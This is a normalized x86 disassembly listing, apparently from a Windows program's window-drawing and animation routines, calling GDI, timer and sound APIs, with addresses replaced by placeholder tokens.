push 0x190
push 0xa8c
push 0xa8c
push 0x0
push 0x10
call [ CreateFontA@IAT ]
mov [ rw-data ] eax
mov ecx [ esp + 0x10 ]
cmp ecx [ rw-data ]
jge r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x90 ]
mov ecx [ rw-data ]
sub eax edx
cmp eax ecx
mov [ esp + 0x10 ] eax
jge r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ esi + eax + 0x18 ] 0x10
jb r-xdata
lea ecx [ esp + 0x74 ]
push ebp
push ecx
call sub_428d60
add esp 0x8
test al al
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xc
mov [ rw-data ] 0x0
mov [ rw-data ] eax
jge r-xdata
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
fild [ esp + 0x18 ]
fild [ rw-data ]
fmul [ rw-data ]
fsubp st1
fmul [ r--data ]
call sub_4b64c4
mov ebp eax
test ebp ebp
jge r-xdata
sub ebx [ esp + 0x30 ]
cmp ebx eax
mov [ esp + 0x18 ] ebx
jge r-xdata
sub ebx [ esp + 0x30 ]
mov [ esp + 0x18 ] ebx
jmp r-xdata
lea ecx [ esp + 0x74 ]
call sub_4480e0
lea ecx [ esp + 0x5c ]
mov [ esp + 0x7a8 ] 0x4
call sub_462cf0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
fild [ esp + 0x10 ]
fild [ rw-data ]
fmul [ rw-data ]
fsubp st1
fmul [ r--data ]
call sub_4b64c4
mov esi eax
xor eax eax
cmp esi eax
jge r-xdata
xor ebp ebp
mov edx [ esp + 0x90 ]
mov eax ecx
sub eax edx
mov [ esp + 0x10 ] eax
cmp [ rw-data ] 0x10
mov ebp [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x10
jb r-xdata
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
test ecx ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
jle r-xdata
cmp ebp eax
je r-xdata
xor esi esi
xor ebx ebx
xor edi edi
jmp r-xdata
mov ebp rw-data
mov ebp rw-data
jmp r-xdata
mov ebp [ rw-data ]
jmp r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add ecx 0x4
cmp esi eax
je r-xdata
mov edx [ esp + 0x10 ]
push eax
push eax
push eax
push eax
push eax
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] eax
lea eax [ esp + 0x70 ]
push eax
lea ecx [ ebp + 0x1 ]
push edi
mov [ esp + 0x80 ] ecx
mov [ esp + 0x84 ] edx
call sub_45cef0
mov edx [ esp + 0x2c ]
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx ebx
push 0x0
lea eax [ esp + 0xa4 ]
sub ecx ebp
push eax
dec ecx
push edi
mov [ esp + 0xac ] ecx
mov [ esp + 0xb0 ] 0x0
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xb8 ] edx
call sub_45cef0
add esp 0x38
xor eax eax
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
neg eax
sbb eax eax
and eax 0x10000
mov ecx rw-data
mov [ rw-data ] eax
mov [ rw-data ] 0x0
call sub_401420
call [ GdiFlush@IAT ]
mov eax [ esp + 0x38 ]
mov ecx [ eax ]
push eax
push ecx
lea ecx [ esp + 0x74 ]
push ecx
lea ecx [ esp + 0x40 ]
mov [ esp + 0x7b4 ] 0xffffffff
call sub_46b3f0
mov edx [ esp + 0x38 ]
push edx
call j_sub_4b66ed#2
add esp 0x4
mov eax 0x1
jmp r-xdata
mov edx [ esp + 0x2c ]
add ecx edx
mov edx [ rw-data ]
add ecx edx
test ecx ecx
je r-xdata
push 0x0
call [ CreateSolidBrush@IAT ]
mov ebx eax
mov eax [ esp + 0x18 ]
sub eax ebp
mov [ esp + 0x48 ] eax
mov eax [ esp + 0x10 ]
sub eax esi
mov [ esp + 0x4c ] eax
push ebx
lea eax [ esp + 0x44 ]
push eax
push edi
mov [ esp + 0x4c ] ebp
mov [ esp + 0x50 ] esi
call [ FillRect@IAT ]
call [ GdiFlush@IAT ]
push ebx
call [ DeleteObject@IAT ]
mov ecx [ rw-data ]
push edi
push ecx
call [ ReleaseDC@IAT ]
mov edx [ rw-data ]
mov [ rw-data ] edx
jmp r-xdata
push eax
push eax
push eax
push eax
push eax
lea edx [ esp + 0x70 ]
push edx
lea ecx [ ebx + 0x1 ]
push edi
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] eax
mov [ esp + 0x80 ] ecx
mov [ esp + 0x84 ] esi
call sub_45cef0
mov eax [ esp + 0x2c ]
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx eax
push 0x0
lea edx [ esp + 0xa4 ]
sub ecx esi
push edx
dec ecx
push edi
mov [ esp + 0xac ] 0x0
mov [ esp + 0xb0 ] ecx
mov [ esp + 0xb4 ] ebx
mov [ esp + 0xb8 ] eax
call sub_45cef0
add esp 0x38
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cdq
idiv esi
imul eax ecx
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
lea ecx [ edi + esi ]
jae r-xdata
cmp ebx edx
jge r-xdata
mov edx [ rw-data ]
push edx
push eax
mov eax [ ecx + 0x14 ]
push eax
push 0x0
call sub_401150
test eax eax
je r-xdata
mov eax rw-data
mov eax ebx
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ edi + ecx ]
push ebp
push eax
call sub_401380
add esp 0x8
test al al
jne r-xdata
inc ebx
add edi 0x1c
jmp r-xdata
sub_485220
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c135c
push eax
mov eax [ rw-data ]
mov [ fs : 0x0 ] esp
sub esp 0xc0
push ebp
push esi
mov esi [ esp + 0xdc ]
xor ebp ebp
cmp eax ebp
mov [ rw-data ] esi
je r-xdata
cmp esi 0xffffffff
je r-xdata
push eax
mov eax [ rw-data ]
push eax
call [ KillTimer@IAT ]
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov ecx [ rw-data ]
push ebx
push edi
push 0xffffffeb
push ecx
call [ GetWindowLongA@IAT ]
mov edx [ rw-data ]
mov ebx eax
mov [ ebx + 0x124 ] edx
mov esi [ rw-data ]
cmp esi ebp
je r-xdata
mov ecx rw-data
call sub_404310
cmp [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov ecx [ rw-data ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0xa8 ] edx
je r-xdata
mov eax [ rw-data ]
cmp esi eax
jl r-xdata
cmp [ rw-data ] ebp
je r-xdata
cmp [ rw-data ] ebp
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
cmp [ rw-data ] ebp
je r-xdata
cmp esi ebp
jne r-xdata
lea esi [ eax - 0x1 ]
cmp esi 0x7fffff
jne r-xdata
cmp [ rw-data ] ebp
push 0xffffffff
lea ecx [ ebx + 0x108 ]
push ebp
je r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebx + 0x28 ]
call sub_401e80
cmp [ rw-data ] ebp
je r-xdata
mov eax [ rw-data ]
imul eax eax 0x70
add eax esi
push eax
lea ecx [ ebx + 0x28 ]
call sub_402540
mov esi [ rw-data ]
mov edx [ esp + 0xe4 ]
mov eax [ esp + 0xd8 ]
push edx
push ebp
push eax
push 0x1
mov [ rw-data ] 0x0
mov [ rw-data ] ebp
push esi
cmp [ rw-data ] ebp
setne al
movzx ecx al
mov [ rw-data ] al
mov eax [ esp + 0xe4 ]
push eax
or edx 0xffffffff
sub edx ecx
mov ecx [ esp + 0xdc ]
push ebp
push ecx
push 0x1
mov [ rw-data ] edx
push 0x1
jmp r-xdata
push esi
call sub_437c70
add esp 0x4
mov esi eax
push rw-data
push rw-data
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebx + 0x98 ]
call sub_401e80
mov eax [ rw-data ]
imul eax eax 0x70
add eax esi
push eax
lea ecx [ ebx + 0x98 ]
call sub_402540
jmp r-xdata
call sub_4719b0
add esp 0x14
mov ecx rw-data
call sub_401420
pop esi
pop ebp
mov ecx [ esp + 0xc0 ]
mov [ fs : 0x0 ] ecx
add esp 0xcc
retn
mov eax [ esp + 0xe8 ]
cmp eax ebp
je r-xdata
mov esi 0x2
mov [ esp + 0x18 ] esi
call sub_401dd0
mov ecx [ rw-data ]
sub ecx [ rw-data ]
test ecx ecx
mov esi 0x1
mov [ esp + 0x18 ] esi
jle r-xdata
mov [ esp + 0x14 ] 0x0
cmp [ rw-data ] 0x8
jl r-xdata
mov esi [ ebx + 0x24 ]
cmp esi ebp
je r-xdata
mov esi [ ebx + 0x20 ]
cmp esi ebp
je r-xdata
mov edx [ rw-data ]
sub edx [ rw-data ]
test edx edx
jle r-xdata
mov eax [ esp + 0x48 ]
cmp eax ebp
je r-xdata
inc [ esi + 0xd48 ]
mov eax [ esp + 0x48 ]
cmp eax ebp
je r-xdata
inc [ esi + 0xd48 ]
mov ecx [ rw-data ]
cmp ecx 0x2
mov [ esp + 0x14 ] 0x1
jne r-xdata
lea ebp [ ebx + 0x20 ]
mov [ esp + 0x48 ] esi
mov esi [ ebp ]
test esi esi
je r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
mov [ esp + 0x48 ] esi
mov esi [ ebx + 0x24 ]
cmp esi ebp
je r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
cmp [ rw-data ] ebp
jle r-xdata
cdq
xor eax edx
sub eax edx
cmp eax 0x1
jg r-xdata
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
inc [ esi + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x4c ]
cmp eax ebp
je r-xdata
inc [ esi + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push sub_40b360
push sub_40a730
mov [ esp + 0x64 ] eax
mov eax [ rw-data ]
mov [ esp + 0x5c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x60 ] edx
mov edx [ rw-data ]
push 0x2
mov [ esp + 0x74 ] eax
mov [ esp + 0x6c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x70 ] edx
mov edx [ rw-data ]
push 0x4
lea eax [ esp + 0x58 ]
push eax
mov [ esp + 0x80 ] ecx
mov [ esp + 0x84 ] edx
call sub_4b6874
push sub_40b360
push sub_40a730
push 0x2
push 0x4
lea ecx [ esp + 0x50 ]
push ecx
mov [ esp + 0xec ] ebp
call sub_4b6874
cmp [ rw-data ] ebp
mov [ esp + 0xd8 ] 0x1
jne r-xdata
cmp ecx 0x2
jne r-xdata
mov [ esp + 0x14 ] 0x0
mov edi [ rw-data ]
test edi edi
mov [ esp + 0x4c ] esi
je r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
cmp eax ebp
mov [ esp + 0x4c ] esi
mov edi eax
je r-xdata
mov edx [ eax + 0xd48 ]
mov edi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
cmp [ rw-data ] ebp
jle r-xdata
mov eax [ rw-data ]
push eax
call sub_4a9250
add esp 0x4
test al al
jne r-xdata
mov eax [ esp + 0x40 ]
test eax eax
je r-xdata
inc [ edi + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x40 ]
cmp eax ebp
je r-xdata
inc [ eax + 0xd48 ]
mov ecx edi
call sub_43fe30
push edi
call j_sub_4b66ed#2
add esp 0x4
cmp [ rw-data ] 0x2
jne r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x40 ] edi
mov edi eax
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
cmp eax ebp
mov [ esp + 0x40 ] edi
mov edi eax
je r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
cmp esi 0x1
jne r-xdata
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x44 ]
cmp eax ebp
je r-xdata
inc [ eax + 0xd48 ]
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov [ esp + 0x14 ] 0x1
jmp r-xdata
mov [ esp + 0x44 ] edi
mov eax [ ebx + 0x24 ]
test eax eax
jne r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov [ esp + 0x44 ] edi
jmp r-xdata
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
cmp ecx ebp
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ ebx + 0x144 ]
test al al
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov edx [ esp + 0x14 ]
mov eax [ esp + 0xec ]
mov ecx [ esp + 0xe0 ]
push 0x1
push edx
mov edx [ rw-data ]
push eax
push ecx
push edx
call sub_47e330
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov ebp [ rw-data ]
mov [ esp + 0x9c ] eax
mov eax [ rw-data ]
mov [ esp + 0xac ] eax
mov eax [ rw-data ]
mov [ esp + 0xb8 ] eax
mov al [ esp + 0x28 ]
mov [ esp + 0xa0 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0xa8 ] edx
mov edx [ rw-data ]
add esp 0x14
test al al
mov [ esp + 0x9c ] ecx
mov [ esp + 0xa0 ] edx
je r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov al [ rw-data ]
test al al
jne r-xdata
push ebp
lea ecx [ esp + 0x4c ]
call sub_40b320
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x140 ] 0x1
jne r-xdata
push sub_40b360
push 0x2
push 0x4
lea ecx [ esp + 0x4c ]
push ecx
mov [ esp + 0xe8 ] 0x0
call sub_4b6814
push sub_40b360
push 0x2
push 0x4
lea edx [ esp + 0x54 ]
push edx
mov [ esp + 0xe8 ] 0xffffffff
call sub_4b6814
mov ecx [ esp + 0xd0 ]
pop edi
pop ebx
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0xcc
retn
cmp [ rw-data ] 0x8
jl r-xdata
push rw-data
lea ecx [ esp + 0x44 ]
call sub_40b320
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov [ esp + 0x4c ] 0x0
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x38 ] 0x0
je r-xdata
mov [ esp + 0x44 ] 0x0
mov edx [ eax + 0xd48 ]
mov esi eax
add eax 0xd48
dec edx
mov ecx edx
test ecx ecx
mov [ eax ] edx
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
lea edx [ esp + 0xac ]
push edx
push eax
call [ GetClientRect@IAT ]
mov esi [ esp + 0xb4 ]
mov eax [ esp + 0xac ]
mov edi [ esp + 0xb8 ]
mov ebx [ esp + 0xb0 ]
mov ecx [ rw-data ]
sub esi eax
sub edi ebx
push ecx
mov [ esp + 0x18 ] esi
mov [ esp + 0x54 ] edi
call [ GetDC@IAT ]
mov ebx eax
test [ rw-data ] 0x1
mov [ esp + 0x10 ] ebx
jne r-xdata
mov ecx [ rw-data ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
test [ rw-data ] 0x2
je r-xdata
push 0x20001
push 0x0
push r--data
call [ PlaySoundA@IAT ]
push 0x0
mov [ esp + 0x3c ] 0x1
call sub_43d2c0
add esp 0x4
mov eax [ rw-data ]
test eax eax
mov edi 0x1
mov [ esp + 0x1f ] 0x0
mov [ esp + 0x24 ] edi
mov [ esp + 0x74 ] edi
jle r-xdata
mov edx [ esp + 0x38 ]
push edx
push 0x0
push 0x0
call sub_40af00
push eax
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
push edi
push esi
push 0x0
push 0x0
push ebx
jmp r-xdata
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x94 ]
mov ecx [ esp + 0x8c ]
mov eax [ esp + 0x88 ]
mov esi edx
mov ebx ebp
sub esi ecx
sub ebx eax
cmp ebx esi
mov esi 0x2
jle r-xdata
mov ecx rw-data
call sub_4421e0
mov edx [ esp + 0x10 ]
mov eax [ rw-data ]
push edx
push eax
call [ ReleaseDC@IAT ]
mov al [ esp + 0x38 ]
test al al
je r-xdata
jge r-xdata
cmp edx edi
je r-xdata
mov eax [ esp + 0x5c ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x60 ]
mov ebp [ esp + 0x58 ]
sub eax ecx
sub edx ebp
cmp eax edx
jle r-xdata
mov [ esp + 0x98 ] eax
mov [ esp + 0x9c ] ecx
mov [ esp + 0xa0 ] ebp
mov [ esp + 0xa4 ] edx
mov [ esp + 0x74 ] esi
call sub_43d380
mov eax [ esp + 0x18 ]
dec eax
shl eax 0x4
mov ebx [ esp + eax + 0x5c ]
lea ecx [ esp + eax + 0x54 ]
mov [ esp + 0x3c ] ecx
mov ecx [ ecx ]
sub ebx ecx
mov [ esp + 0xa8 ] ecx
mov [ esp + 0xcc ] ebx
mov edi 0x64
xor ebp ebp
test edx edx
jne r-xdata
mov ebx [ esp + 0x5c ]
sub ebx ecx
mov edi 0x64
xor ebp ebp
test eax eax
mov eax [ esp + 0xe8 ]
test eax eax
mov edx [ rw-data ]
jle r-xdata
mov edx ebp
mov [ esp + 0x68 ] edx
mov edx [ esp + 0x5c ]
mov [ esp + 0x6c ] edx
mov edx [ esp + 0x60 ]
mov [ esp + 0x70 ] edx
cdq
sub eax edx
sar eax 0x1
add eax ecx
mov [ esp + 0x64 ] ecx
mov [ esp + 0x5c ] eax
mov [ esp + 0x64 ] eax
mov [ esp + 0x18 ] esi
mov [ esp + 0x1f ] 0x1
mov [ esp + 0x24 ] esi
jmp r-xdata
call sub_4b69c7
mov esi eax
mov eax 0x2aaaaaab
imul edi
mov eax edx
shr eax 0x1f
add edx eax
imul esi edx
mov eax 0x80010003
imul esi
mov ecx edx
add ecx esi
sar ecx 0xe
mov edx ecx
shr edx 0x1f
add ecx edx
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
add ecx eax
sub edi ecx
mov ecx 0x64
sub ecx edi
imul ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + ebp * 4 + 0xbc ] edx
inc ebp
cmp ebp 0x4
jl r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ esp + 0x28 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0x2c ] edx
mov edx [ eax + 0xc ]
mov eax [ esp + 0x14 ]
mov [ esp + 0x30 ] ecx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x80 ] eax
mov eax 0x1
cmp ecx eax
mov [ esp + 0x34 ] edx
je r-xdata
call sub_4b69c7
mov esi eax
mov eax 0x2aaaaaab
imul edi
mov eax edx
shr eax 0x1f
add edx eax
imul esi edx
mov eax 0x80010003
imul esi
mov ecx edx
add ecx esi
sar ecx 0xe
mov edx ecx
shr edx 0x1f
add ecx edx
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
add ecx eax
sub edi ecx
mov ecx 0x64
sub ecx edi
imul ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + ebp * 4 + 0xbc ] edx
inc ebp
cmp ebp 0x4
jl r-xdata
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x5c ]
mov ebp [ esp + 0x50 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x60 ]
xor edi edi
mov [ esp + 0x2c ] edx
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x20 ] edi
nop
xor eax eax
mov cl [ esp + 0x1f ]
test cl cl
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov ebp [ esp + 0x30 ]
mov esi [ esp + 0x38 ]
sub esi ebp
mov ebp [ esp + 0x34 ]
sub ebp eax
lea eax [ esp + 0xb0 ]
push 0x0
push eax
mov [ esp + 0x48 ] ecx
call sub_40af00
mov edx [ esp + 0x38 ]
push eax
mov eax [ esp + 0x38 ]
push 0x0
push 0x0
mov ecx ebp
imul ecx [ esp + 0x3c ]
push esi
push ecx
mov ecx [ esp + 0x30 ]
push 0x0
push 0x0
push esi
push ebp
push edx
push eax
push ecx
mov ecx [ esp + 0x78 ]
call sub_4421e0
mov ebp [ esp + 0x50 ]
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edi [ esp + 0x30 ]
mov esi [ esp + 0x38 ]
sub esi edi
mov edi eax
lea eax [ esp + 0xb0 ]
push 0x0
push eax
sub edi ecx
call sub_40af00
push eax
mov eax [ esp + 0x34 ]
mov edx [ esp + 0x3c ]
push 0x0
push 0x0
mov ecx edi
imul ecx eax
dec eax
push esi
imul eax edi
push ecx
mov ecx [ esp + 0x30 ]
push 0x0
push eax
mov eax [ esp + 0x50 ]
push esi
push edi
push edx
push eax
push ecx
mov ecx ebx
call sub_4421e0
mov edi [ esp + 0x50 ]
jmp r-xdata
mov edi [ esp + 0x50 ]
lea ecx [ esp + eax * 4 + 0x48 ]
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x3c ] ecx
nop
call [ GetStockObject@IAT ]
mov edx [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push edx
call [ FillRect@IAT ]
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x3c ]
push edx
push eax
call sub_45cef0
add esp 0x1c
jmp r-xdata
mov eax [ esp + 0x38 ]
mov esi [ esp + 0x28 ]
push eax
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x20 ]
push 0x0
push 0x0
push ebp
push ecx
push 0x0
push edi
push ebp
mov edx esi
sub edx edi
push edx
push 0x0
push edi
push eax
mov ecx rw-data
call sub_4421e0
mov edi esi
call [ GdiFlush@IAT ]
call [ timeGetTime@IAT ]
mov ecx [ rw-data ]
mov edx eax
sub edx ebx
cmp edx ecx
jae r-xdata
call [ GetStockObject@IAT ]
mov edx [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
push edx
call [ FillRect@IAT ]
mov eax [ esp + 0x14 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x3c ]
push edx
push eax
call sub_45cef0
add esp 0x1c
jmp r-xdata
mov eax [ esp + 0x38 ]
mov esi [ esp + 0x30 ]
push eax
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x8c ]
push eax
mov eax [ esp + 0x20 ]
push 0x0
push 0x0
push edi
push ecx
push 0x0
push esi
push edi
sub edx esi
push edx
push 0x0
push esi
push eax
mov ecx rw-data
call sub_4421e0
mov [ esp + 0x80 ] esi
call [ GdiFlush@IAT ]
call [ timeGetTime@IAT ]
mov ecx [ rw-data ]
mov edx eax
sub edx ebp
cmp edx ecx
jae r-xdata
mov eax [ esp + 0x20 ]
inc eax
cmp eax 0x4
mov [ esp + 0x20 ] eax
jl r-xdata
sub ebx eax
add ebx ecx
push ebx
call [ Sleep@IAT ]
mov eax [ esp + 0x20 ]
inc eax
cmp eax 0x4
mov [ esp + 0x20 ] eax
jl r-xdata
sub ebp eax
add ebp ecx
push ebp
call [ Sleep@IAT ]
call [ timeGetTime@IAT ]
mov edx [ esp + 0x20 ]
mov esi [ esp + 0x54 ]
mov ecx [ esp + 0x48 ]
mov ebx eax
mov eax [ esp + edx * 4 + 0xbc ]
add eax esi
test ecx ecx
mov [ esp + 0x28 ] eax
push 0x0
je r-xdata
mov eax [ esp + 0x38 ]
push eax
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x3c ]
push eax
mov eax [ esp + 0x38 ]
push 0x0
push 0x0
push ebp
push ecx
push 0x0
push eax
push ebp
sub edx eax
push edx
push 0x0
push eax
mov eax [ esp + 0x48 ]
push eax
mov ecx rw-data
call sub_4421e0
cmp [ esp + 0x18 ] 0x2
jne r-xdata
call [ timeGetTime@IAT ]
mov edx [ esp + 0x20 ]
mov ecx [ esp + 0x28 ]
mov ebx [ esp + edx * 4 + 0xbc ]
mov edx [ esp + 0x3c ]
mov esi [ esp + 0xcc ]
mov ebp eax
mov eax ecx
sub eax ebx
mov ebx [ edx ]
add eax esi
test ebx ebx
mov [ esp + 0x30 ] eax
push 0x0
je r-xdata
mov eax [ esp + 0x38 ]
push eax
push 0x0
push 0x0
call sub_40af00
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
push eax
mov eax [ esp + 0xb8 ]
push 0x0
push 0x0
push edi
push ecx
push 0x0
push eax
push edi
sub esi eax
push esi
push 0x0
push eax
push edx
mov ecx rw-data
call sub_4421e0
cmp [ esp + 0x18 ] 0x2
jne r-xdata
mov eax [ esp + 0x38 ]
push eax
push 0x0
push 0x0
call sub_40af00
mov edx [ esp + 0x5c ]
mov ecx [ esp + 0x3c ]
push eax
mov eax [ esp + 0x24 ]
push 0x0
push 0x0
push edx
push eax
push 0x0
push ecx
push edx
sub eax ecx
push eax
push 0x0
push ecx
jmp r-xdata
mov ebx [ esp + 0xa0 ]
sub ebx [ esp + 0x64 ]
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x38 ]
push ecx
push 0x0
push 0x0
call sub_40af00
mov edx [ esp + 0x20 ]
push eax
mov eax [ esp + 0x38 ]
push 0x0
push 0x0
push edi
push edx
push 0x0
push 0x0
push edi
push eax
push 0x0
push 0x0
mov ebx [ esp + 0x5c ]
sub ebx [ esp + 0x88 ]
test ebx ebx
jle r-xdata
mov ecx [ esp + 0x48 ]
push ecx
mov edi 0x64
xor ebp ebp
mov edi 0x64
xor ebp ebp
jmp r-xdata
call sub_4b69c7
mov esi eax
mov eax 0x2aaaaaab
imul edi
mov ecx edx
shr ecx 0x1f
add edx ecx
imul esi edx
mov eax 0x80010003
imul esi
mov ecx edx
add ecx esi
sar ecx 0xe
mov edx ecx
shr edx 0x1f
add ecx edx
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
add ecx eax
sub edi ecx
mov ecx 0x64
sub ecx edi
imul ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + ebp * 4 + 0xbc ] edx
inc ebp
cmp ebp 0x4
jl r-xdata
mov edi [ timeGetTime@IAT ]
lea ecx [ esp + 0xc8 ]
mov [ esp + 0x18 ] ecx
mov [ esp + 0x24 ] 0x4
call sub_4b69c7
mov esi eax
mov eax 0x2aaaaaab
imul edi
mov eax edx
shr eax 0x1f
add edx eax
imul esi edx
mov eax 0x80010003
imul esi
mov ecx edx
add ecx esi
sar ecx 0xe
mov edx ecx
shr edx 0x1f
add ecx edx
mov eax edi
cdq
and edx 0x3
add eax edx
sar eax 0x2
add ecx eax
sub edi ecx
mov ecx 0x64
sub ecx edi
imul ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + ebp * 4 + 0xbc ] edx
inc ebp
cmp ebp 0x4
jl r-xdata
mov ebp [ esp + eax * 4 + 0x40 ]
test ebp ebp
push 0x0
je r-xdata
xor eax eax
mov ecx [ esp + 0x88 ]
mov edx [ esp + 0x8c ]
mov eax [ esp + 0x5c ]
mov edi [ esp + 0x10 ]
mov esi [ timeGetTime@IAT ]
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x94 ]
mov [ esp + 0x2c ] edx
lea edx [ esp + 0xc8 ]
mov [ esp + 0x30 ] eax
mov [ esp + 0x34 ] ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x20 ] 0x4
